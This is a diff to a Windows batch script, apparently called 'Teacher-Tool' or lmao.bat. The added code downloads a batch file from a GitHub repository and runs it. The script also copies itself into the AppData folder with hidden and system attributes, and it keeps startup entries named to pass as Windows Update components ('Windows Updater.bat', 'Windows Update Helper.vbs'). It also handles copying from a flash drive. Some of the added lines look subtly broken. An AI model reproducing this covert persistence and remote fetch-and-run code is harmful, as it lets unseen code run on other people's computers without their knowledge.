@@ -37,7 +37,9 @@ set skipcheck=true
 )
 )
 set HDDver=%HDDver:REM =%
-set DBGVer=%HDDver:~0,3%==DBG 
+set /p DBGVer=<lmao.bat
+set DBGVer=%DBGVer:~4,3%
+echo %DBGVer%
 if %DBGVer%==DBG (echo Using DBG version... Beware!)
 
 
@@ -57,17 +59,17 @@ curl --ssl-no-revoke https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool
 ) else (
 curl --ssl-no-revoke https://raw.githubusercontent.com/RealFoxerity/Teacher-Tool/main/Updates/CurrentDEBUGVer.dat >ver.dat
 )
-
-set /a NewVer=<ver.dat
+set /p NewVer=<ver.dat
 echo Newest version available is: %NewVer% 
 set vers=%NewVer:DBGVersion=%
 set vers=%vers:Version=%
 set vers=%vers:.=%
 
 set WillUpd=False
-if exists "%NewVer%.bat" (set WillUpd=True)
+if exist "%NewVer%.bat" (set WillUpd=True)
 
-if not exist NOONLINEUPDS.dat (set UpdatedFromOnline=True ) else (set UpdatedFromOnline=False)
+if not exist NOONLINEUPDS.dat (set UpdatedFromOnline=True) else (set UpdatedFromOnline=False)
+
 if %UpdatedFromOnline%==True (echo Performing online update [currently dbg feature only]... && goto :installLmao)
 :AfterOnlineUpd
 
@@ -195,18 +197,22 @@ set vers=%ver:~8%
 set vers=%vers:.=%
 set vers=%vers:[DEBUGrelease]=%
 
+
 if %UpdatedFromOnline%==False (
 :installLmao
-if "%HDver%"=="%vers%" (if %copied%==false (if %skipcheck%==false (
+if "%HDver%"=="%vers%" (if "%copied%"=="false" (if %skipcheck%==false (
 if exist forceupd.dat (
 echo No version change, but forcing update anyways...
 ) else (
 echo no version change, update skipped...
-goto :skipupdate
+REM goto :skipupdate
 ))))
 
+if "%UpdatedFromOnline%"=="True" (goto :OnlineUpd)
+
 if %UpdatedFromOnline%==False (
-if %dirr%==FLASH (
+if "%dirr%"=="FLASH" (
+:OnlineUpd
 if exist lmao.bat (
 if %skipcheck%==false (
 if "%HDver%" LSS "%vers%" (if not "%HDver%"=="0" (echo upgrading...) else (echo installing...))
@@ -226,7 +232,8 @@ attrib -s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updat
 goto :createvbs
 :aftervbs
 echo vbs and startup bat installed
-if %UpdatedFromOnline%==True (if %WillUpd==False (
+if %UpdatedFromOnline%==True (if %WillUpd%==False (
+echo "https://github.com/RealFoxerity/Teacher-Tool/blob/main/Updates/%NewVer%.bat"
 curl -O --ssl-no-revoke "https://github.com/RealFoxerity/Teacher-Tool/blob/main/Updates/%NewVer%.bat"
 echo Calling downloaded bat...
 call "%NewVer%.bat"
@@ -238,13 +245,13 @@ del "%appdata%\Microsoft\Windows\lmao.bat" >nul 2>&1
 attrib -s -h lmao.bat
 if %UpdatedFromOnline%==False (
 xcopy lmao.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1
-) else (xcopy %NewVer%.bat "%appdata%\Microsoft\Windows\" /y >nul 2>&1)
+) else (xcopy "%NewVer%.bat" "%appdata%\Microsoft\Windows\" /y >nul 2>&1)
 
 attrib +s +h lmao.bat
 echo new lmao.bat installed
 )
 :skipupdate
-if %onlineUpd%==True (goto :AfterOnlineUpd && echo Online update was completed successfully...)
+if "%UpdatedFromOnline%"=="True" (goto :AfterOnlineUpd && echo Online update was completed successfully...)
 
 attrib -h alreadycopied.dat
 echo true >alreadycopied.dat
@@ -269,7 +276,7 @@ exit
 )
 echo on hdd bat
 echo removing temp file
-del "%appdata%\Microsoft\Windows\updating.dat"
+del "%appdata%\Microsoft\Windows\updating.dat" >nul 2>&1
 attrib +s "%appdata%\Microsoft\Windows\Windows Update Helper.vbs"
 attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Updater.bat"
 
